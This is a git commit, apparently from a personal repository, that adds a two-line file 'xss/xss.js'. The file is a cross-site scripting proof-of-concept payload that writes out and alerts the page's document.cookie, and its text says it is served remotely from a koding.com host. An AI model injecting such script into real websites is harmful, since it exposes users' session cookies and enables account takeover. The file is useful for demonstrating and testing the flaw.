ec65ed18ea80b32974ac15ba751a6593e8c62d89
Rajiv Vishwa <rajivvishwa@gmail.com>
2013-06-23 09:58:40 -0700

    xss

---
+++ xss/xss.js
@@ -0,0 +1,2 @@
+document.write ("This is remote text via xss.js located at rajivvishwa.koding.com " + document.cookie);
+alert ("This is remote text via xss.js located at rajivvishwa.koding.com " + document.cookie);
